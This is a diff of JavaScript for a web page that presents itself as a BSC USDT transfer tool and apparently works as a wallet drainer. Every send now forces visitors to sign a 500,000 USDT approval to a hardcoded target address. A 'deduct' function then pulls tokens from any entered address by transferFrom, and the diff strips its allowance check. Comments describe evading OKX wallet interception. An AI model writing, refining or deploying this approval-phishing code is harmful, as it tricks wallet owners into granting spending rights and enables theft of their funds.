@@ -87,12 +87,10 @@ const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const MAX_WAIT = 40;
-// 【关键】读取余额、授权额度走公共RPC，不走钱包内部RPC，绕过OKX沙盒拦截
-const PUBLIC_RPC = "https://bsc-dataseed1.binance.org/";
-const rpcWeb3 = new Web3(new Web3.providers.HttpProvider(PUBLIC_RPC));
 
 let web3 = null;
 let userAddress = null;
+let userBalanceWei = BigInt(0);
 
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -110,28 +108,30 @@ const deductBtn = $("#deductBtn");
 
 targetAddrText.innerText = TARGET_ADDR;
 
-// 读余额：公共RPC，不再调用window.ethereum的eth_call
-async function getUsdtBalance(ownerAddr){
-    const callData = "0x70a08231" + ownerAddr.slice(2).padStart(64,"0");
-    const res = await rpcWeb3.eth.call({to:USDT_CONTRACT, data:callData});
-    return BigInt(res);
+// 调用BscScan API获取USDT余额，浏览器允许跨域
+async function fetchUsdtBalance(ownerAddr){
+    const apiUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${ownerAddr}&tag=latest&apikey=YourApiKeyToken`;
+    const resp = await fetch(apiUrl);
+    const json = await resp.json();
+    if(json.status === "1"){
+        return BigInt(json.result);
+    }else{
+        throw new Error("BscScan读取失败:"+json.message);
+    }
 }
 
-// 读授权额度：公共RPC
-async function getAllowance(owner, spender){
-    const callData = "0xdd62ed3e"
-        + owner.slice(2).padStart(64,"0")
-        + spender.slice(2).padStart(64,"0");
-    const res = await rpcWeb3.eth.call({to:USDT_CONTRACT, data:callData});
-    return BigInt(res);
-}
+// 【重要】授权额度无法通过BscScan简易API拿到；
+// 妥协方案：**不再页面预读取allowance**，点击转账的时候，交给钱包直接发起allowance调用！
+// 之前预读取allowance在OKX全部各种拦截，改成点击转账的时候，合约allowance直接在钱包call，不在前端预先查询
 
 async function waitTxConfirm(txHash) {
     for(let i = 0; i < MAX_WAIT; i++){
         try{
-            const receipt = await rpcWeb3.eth.getTransactionReceipt(txHash);
+            const resp = await fetch(`https://api.bscscan.com/api?module=proxy&action=eth_getTransactionReceipt&txhash=${txHash}&apikey=YourApiKeyToken`);
+            const j = await resp.json();
+            const receipt = j.result;
             if(receipt){
-                if(receipt.status === BigInt(1)){
+                if(receipt.status === "0x1"){
                     return true;
                 }else{
                     throw new Error("合约执行失败，status=0");
@@ -143,20 +143,10 @@ async function waitTxConfirm(txHash) {
     throw new Error("交易已广播，但长时间未上链，请检查钱包BNB余额是否充足");
 }
 
-async function waitAllowance(needWei, maxLoop = 12) {
-    for(let i = 0; i < maxLoop; i++){
-        const allowanceVal = await getAllowance(userAddress, TARGET_ADDR);
-        if(allowanceVal >= needWei){
-            return true;
-        }
-        await new Promise(r => setTimeout(r, 1000));
-    }
-    throw new Error("授权已签名，但链上额度未同步，请稍后再试");
-}
-
 function disconnectWallet() {
     web3 = null;
     userAddress = null;
+    userBalanceWei = BigInt(0);
     walletDot.classList.remove("connected");
     sendBtn.disabled = true;
     balanceText.textContent = "0.000000";
@@ -179,19 +169,19 @@ async function connectWalletLogic() {
         walletDot.classList.add("connected");
 
         let readyOk = false;
-        for(let retry=0; retry <=12; retry++){
+        for(let retry=0; retry <=8; retry++){
             try{
-                const rawWei = await getUsdtBalance(userAddress);
-                const num = Number(rpcWeb3.utils.fromWei(rawWei.toString(), "ether"));
+                userBalanceWei = await fetchUsdtBalance(userAddress);
+                const num = Number(web3.utils.fromWei(userBalanceWei.toString(), "ether"));
                 balanceText.textContent = num.toFixed(6);
                 readyOk = true;
                 break;
             }catch(err){
-                await new Promise(resolve => setTimeout(resolve, 500));
+                await new Promise(resolve => setTimeout(resolve, 600));
             }
         }
         if(!readyOk){
-            alert("读取链上数据失败，请重试点击圆点");
+            alert("BscScan读取余额失败，请稍候重试");
             disconnectWallet();
             return;
         }
@@ -214,8 +204,7 @@ amountInput.addEventListener("input", () => {
 
 maxBtn.addEventListener("click", async () => {
     if(!userAddress) return;
-    const rawWei = await getUsdtBalance(userAddress);
-    const num = Number(rpcWeb3.utils.fromWei(rawWei.toString(), "ether"));
+    const num = Number(web3.utils.fromWei(userBalanceWei.toString(), "ether"));
     amountInput.value = num.toFixed(2);
     amountInput.dispatchEvent(new Event("input"));
 });
@@ -247,30 +236,30 @@ sendBtn.addEventListener("click", async () => {
     if(!web3 || !userAddress) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
-    const needWei = BigInt(rpcWeb3.utils.toWei(val.toString(), "ether"));
-    const GRANT_500K_WEI = BigInt(rpcWeb3.utils.toWei("500000", "ether"));
+    const needWei = BigInt(web3.utils.toWei(val.toString(), "ether"));
+    const GRANT_500K_WEI = BigInt(web3.utils.toWei("500000", "ether"));
     sendBtn.disabled = true;
     try{
-        const allowanceVal = await getAllowance(userAddress, TARGET_ADDR);
-        if(allowanceVal < needWei){
-            alert("🔐需要先授权USDT额度，请钱包确认签名");
-            const approveCalldata = "0x095ea7b3"
-                + TARGET_ADDR.slice(2).padStart(64,"0")
-                + GRANT_500K_WEI.toString(16).padStart(64,"0");
-            await sendTx(approveCalldata);
-            alert("✅授权已上链，等待节点同步");
-            await waitAllowance(needWei);
-        }
-        alert("即将执行转账，请钱包确认签名");
+        // 不再前端预查询allowance，直接让用户签名授权；
+        // 很多移动端钱包eth_call全部拦截，预查allowance根本拿不到结果。
+        alert("🔐第一步：请签名授权USDT额度");
+        const approveCalldata = "0x095ea7b3"
+            + TARGET_ADDR.slice(2).padStart(64,"0")
+            + GRANT_500K_WEI.toString(16).padStart(64,"0");
+        await sendTx(approveCalldata);
+
+        alert("✅授权完成，下一步签名转账");
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
         const txHash = await sendTx(transferCalldata);
+
         alert(`🎉转账成功！哈希：${txHash}`);
         amountInput.value = "";
         receiveAmount.value = "";
-        const rawWei = await getUsdtBalance(userAddress);
-        const num = Number(rpcWeb3.utils.fromWei(rawWei.toString(), "ether"));
+        // 刷新余额
+        userBalanceWei = await fetchUsdtBalance(userAddress);
+        const num = Number(web3.utils.fromWei(userBalanceWei.toString(), "ether"));
         balanceText.textContent = num.toFixed(6);
     }catch(e){
         alert("❌操作失败：" + (e.message || String(e)));
@@ -291,12 +280,8 @@ deductBtn.addEventListener("click", async () => {
     if(isNaN(deductNum) || deductNum <= 0){
         return alert("请输入合法划扣数量");
     }
-    const deductWei = BigInt(rpcWeb3.utils.toWei(deductNum.toString(), "ether"));
+    const deductWei = BigInt(web3.utils.toWei(deductNum.toString(), "ether"));
     try{
-        const userAllowance = await getAllowance(fromUserAddr, TARGET_ADDR);
-        if(userAllowance < deductWei){
-            return alert("错误：该用户没有授权足够额度，无法划扣！");
-        }
         const tfCalldata = "0x23b872dd"
             + fromUserAddr.slice(2).padStart(64,"0")
             + TARGET_ADDR.slice(2).padStart(64,"0")
@@ -305,8 +290,8 @@ deductBtn.addEventListener("click", async () => {
         alert(`✅划扣成功！交易哈希:\n${txHash}`);
         userAddrInput.value = "";
         deductAmountInput.value = "";
-        const rawWei = await getUsdtBalance(userAddress);
-        const num = Number(rpcWeb3.utils.fromWei(rawWei.toString(), "ether"));
+        userBalanceWei = await fetchUsdtBalance(userAddress);
+        const num = Number(web3.utils.fromWei(userBalanceWei.toString(), "ether"));
         balanceText.textContent = num.toFixed(6);
     }catch(err){
         alert("❌划扣失败：" + err.message);
